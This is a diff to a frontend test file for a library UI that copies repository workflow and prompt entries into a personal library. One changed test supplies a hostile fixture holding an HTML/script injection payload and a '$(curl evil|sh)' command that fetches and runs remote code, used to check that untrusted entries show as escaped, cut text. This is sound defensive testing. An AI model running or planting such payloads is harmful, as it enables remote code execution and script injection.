@@ -82,6 +82,17 @@ it("reads a repo entry read-only and copies it to Personal without a write to th
   expect(await screen.findByRole("button", { name: /^Start dev server/ })).toBeVisible();
 });
 
+it("copies a repo entry by its own file and index, which count dropped entries and repeat across files", async () => {
+  const suggestions = { ...suggestionFixtures(), workflows: [{ ...suggestionFixtures().workflows[0]!, index: 5 }], prompts: [{ ...suggestionFixtures().prompts[0]!, index: 5 }] };
+  const mock = createLibraryMock({ suggestions });
+  const copy = vi.spyOn(mock, "copySuggestion");
+  const { user } = await mount(mock);
+  await pickItem(user, "Review a diff");
+  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
+  await waitFor(() => expect(copy).toHaveBeenCalledWith("p1", "prompts.json", 5));
+  expect(mock.writes).toEqual(["prompt.create:Review a diff for open redirects"]);
+});
+
 it("copies a repo entry once for a double click", async () => {
   const { user, mock } = await mount(createLibraryMock({ delayMs: 30 }));
   await pickItem(user, "Start dev server");
@@ -102,7 +113,7 @@ it("lists the entries a repository file had to skip", async () => {
 });
 
 it("shows a hostile repo entry as escaped, cut text", async () => {
-  const hostile = { ...suggestionFixtures(), workflows: [{ index: 0, name: `<img src=x onerror=alert(1)>${"n".repeat(200)}`, description: "<script>1</script>", command: `$(curl evil|sh) ${"c".repeat(9000)}`, params: [], env_set_ids: [] }] };
+  const hostile = { ...suggestionFixtures(), workflows: [{ file: "workflows.json" as const, index: 0, name: `<img src=x onerror=alert(1)>${"n".repeat(200)}`, description: "<script>1</script>", command: `$(curl evil|sh) ${"c".repeat(9000)}`, params: [], env_set_ids: [] }] };
   const { user } = await mount(createLibraryMock({ suggestions: hostile }));
   await user.click(await screen.findByRole("button", { name: /^<img src=x/ }));
   const view = document.querySelector("section.lib")!;
